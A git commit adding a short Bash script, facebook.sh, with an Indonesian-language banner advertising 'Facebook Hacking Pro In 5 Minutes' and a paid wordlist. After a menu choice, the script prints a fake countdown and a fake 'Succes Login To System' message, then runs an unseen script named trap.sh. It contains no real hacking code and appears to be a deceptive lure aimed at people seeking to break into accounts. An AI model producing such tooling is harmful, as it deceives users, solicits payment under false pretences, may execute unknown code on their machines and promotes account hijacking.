ac14651c129c4c30e686006de04aaf955f22a5cb
Rezzabodong <42667691+Rezzabodong@users.noreply.github.com>
2018-11-06 10:18:03 +0000

    Create facebook.sh

---
+++ facebook.sh
@@ -0,0 +1,33 @@
+#!/bin/bash
+#version 1.0
+echo ""
+figlet Fb Hack Pro
+echo " ========================================================"
+echo " |-------------------------------------------------------/"
+echo " | Facebook Hacking Pro In 5 Minutes✓                    |"
+echo " | Vvip Wordlist✓                                        |"
+echo " | Vvip Script ✓                                         |"
+echo " | Bayaran Kecil Hanya 5k Pulsa                          |"
+echo " |-------------------------------------------------------/"
+echo ""
+echo ""
+echo ""
+echo " [Klik Angka 1 Untuk Melanjutkan]"
+read -p "Masukan :" pil ;
+
+if [ $pil = 1 ] || [ $pil = 01 ]
+then
+clear
+echo "Tunggu Sebenta Sedang Masuk Ke system"
+echo "Wait 3 Second"
+echo "1"
+sleep 2
+echo "2"
+sleep 2
+echo "3"
+sleep 4
+echo "Authencation"
+sleep 5
+echo "Succes Login To System!!!!"
+sh trap.sh
+fi
